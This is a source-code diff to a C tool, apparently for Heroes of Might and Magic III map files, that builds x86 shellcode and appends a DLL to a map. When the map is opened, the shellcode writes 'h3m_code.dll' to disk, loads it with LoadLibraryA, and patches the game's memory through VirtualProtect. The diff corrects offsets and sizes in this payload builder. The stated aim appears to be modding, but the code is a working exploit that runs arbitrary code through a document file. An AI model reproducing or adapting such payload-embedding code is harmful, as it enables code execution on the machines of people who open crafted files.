@@ -208,11 +208,13 @@ struct shellcode_eof_load_dll_t {
     uint32_t CreateFileA;
     uint8_t c1_4[6];
     uint32_t dll_size;
-    uint8_t c1_5[10];
+    uint8_t c1_5[2];
+    uint32_t dll_offset;
+    uint8_t c1_6[4];
     uint32_t WriteFile;
-    uint8_t c1_6[3];
-    uint32_t CloseHandle2;
     uint8_t c1_7[3];
+    uint32_t CloseHandle2;
+    uint8_t c1_8[3];
     uint32_t LoadLibraryA;
     uint8_t c2_1[6];
     uint32_t GetModuleHandleA1;
@@ -222,7 +224,7 @@ struct shellcode_eof_load_dll_t {
     uint32_t GetModuleHandleA2;
     uint8_t c2_4[7];
     uint32_t GetProcAddress2;
-    uint8_t c2_5[31];
+    uint8_t c2_5[40];
     uint32_t orig_retn;
     uint8_t c2_6[4];
     uint32_t map_format;
@@ -240,14 +242,14 @@ static const uint8_t SHELLCODE_EOF_LOAD_DLL[] = {
     0x6A, 0x00,                                     // PUSH 0
     0x6A, 0x03,                                     // PUSH 3
     0x68, 0x00, 0x00, 0x00, 0x40,                   // PUSH 40000000
-    0x8D, 0xB5, 0xA5, 0x00, 0x00, 0x00,             // LEA ESI, [EBP + 0AC] ; str "h3m_code.dll", from below
+    0x8D, 0xB5, 0xAE, 0x00, 0x00, 0x00,             // LEA ESI, [EBP + 0AE] ; str "h3m_code.dll", from below
     0x56,                                           // PUSH ESI
     0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,             // CALL DWORD PTR DS : [<&KeRNeL32.CreateFileA>]
     0x89, 0xC3,                                     // MOV EBX, EAX
     0x6A, 0x00,                                     // PUSH 0
     0x54,                                           // PUSH ESP
     0x68, 0x12, 0x34, 0x56, 0x78,                   // PUSH 0x12345678 ; dll_size
-    0x81, 0xC5, 0x12, 0x34, 0x56, 0x78,             // ADD EBP, 0x12345678 ; past this buffer and target fix buffer TODOTODOTDOTODTODODOTDO
+    0x81, 0xC5, 0x12, 0x34, 0x56, 0x78,             // ADD EBP, 0x12345678 ; dll_offset
     0x55,                                           // PUSH EBP
     0x53,                                           // PUSH EBX
     0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,             // CALL DWORD PTR DS : [<&KeRNeL32.WriteFile>]
@@ -279,7 +281,7 @@ static const uint8_t SHELLCODE_EOF_LOAD_DLL[] = {
     0xC7, 0x03, 0xC2, 0x10, 0x00, 0x00,             // MOV DWORD PTR DS : [EBX], 10C2 ; patch MessageBox function to RETN 4
     // Call target specific shellcode to prevent crashes
     0x89, 0xF0,                                     // MOV EAX, ESI
-    0x83, 0xC0, 0x10,                               // ADD EAX, 10 ; point to target specific shellcode (past end of this buffer)
+    0x83, 0xC0, 0x0F,                               // ADD EAX, 0F ; point to target specific shellcode (past end of this buffer)
     0xFF, 0xD0,                                     // CALL EAX ; CALL target specific shellcode
     // Restore state
     0x61,                                           // POPAD
@@ -313,7 +315,7 @@ static const uint8_t TARGET_FIX_H3COMPLETE[] = {
     0xBB, 0x02, 0x48, 0x50, 0x00,                   // MOV EBX, 504802 ; crash spot in Heroes3.exe
     0x56,                                           // PUSH ESI
     0x6A, 0x40,                                     // PUSH 40
-    0x6A, 0xFF,                                     // PUSH FF
+    0x6A, 0x79,                                     // PUSH 79 ; max size for 0x6A before it wraps around
     0x53,                                           // PUSH EBX
     0xFF, 0xD7,                                     // CALL EDI ; Call VirtualProtect()
     //// Code that is written inline at 00504802:
@@ -328,7 +330,7 @@ static const uint8_t TARGET_FIX_H3COMPLETE[] = {
     0xBB, 0xD6, 0x2B, 0x01, 0x10,                   // MOV EBX, 10012BD6 ; code cave in smackw32.dll
     0x56,                                           // PUSH ESI
     0x6A, 0x40,                                     // PUSH 40
-    0x6A, 0xFF,                                     // PUSH FF
+    0x6A, 0x79,                                     // PUSH 79 ; max size for 0x6A before it wraps around
     0x53,                                           // PUSH EBX
     0xFF, 0xD7,                                     // CALL EDI ; Call VirtualProtect()
     ////  Code that is written to code cave at 10012BD6:
@@ -372,6 +374,11 @@ static const uint8_t TARGET_FIX_HDMOD[] = {
 static const uint8_t * const TARGET_FIXES[] = {
     TARGET_FIX_H3COMPLETE,
     TARGET_FIX_HDMOD
+};
+
+static const unsigned int TARGET_FIX_SIZES[] = {
+    sizeof(TARGET_FIX_H3COMPLETE),
+    sizeof(TARGET_FIX_HDMOD)
 };
 
 // Data that makes the map editor satisfied by being a valid OA body, 
@@ -474,9 +481,10 @@ int h3m_modembed_write_eof_dll(const struct H3M_MODEMBED *hm, uint32_t fm, FILE 
 
     const struct iat_t *const iat = TARGET_IATS[hm->target];
     const uint8_t *const shellcode_fix = TARGET_FIXES[hm->target];
-    unsigned int shellcode_fix_size = sizeof(TARGET_FIXES[hm->target]);
+    unsigned int shellcode_fix_size = TARGET_FIX_SIZES[hm->target];
+    uint32_t dll_offset = sizeof(*shellcode_eof) + shellcode_fix_size;
     uint32_t orig_retn = TARGET_RETNS[hm->target];
-
+    
     // Construct DLL loading shellcode
     shellcode_eof = malloc(sizeof(*shellcode_eof));
     memcpy(shellcode_eof, SHELLCODE_EOF_LOAD_DLL,
@@ -491,6 +499,7 @@ int h3m_modembed_write_eof_dll(const struct H3M_MODEMBED *hm, uint32_t fm, FILE 
     shellcode_eof->LoadLibraryA = iat->LoadLibraryA;
     shellcode_eof->WriteFile = iat->WriteFile;
     shellcode_eof->dll_size = hm->dll_size;
+    shellcode_eof->dll_offset = dll_offset;
     shellcode_eof->orig_retn = orig_retn;
     shellcode_eof->map_format = fm;
 
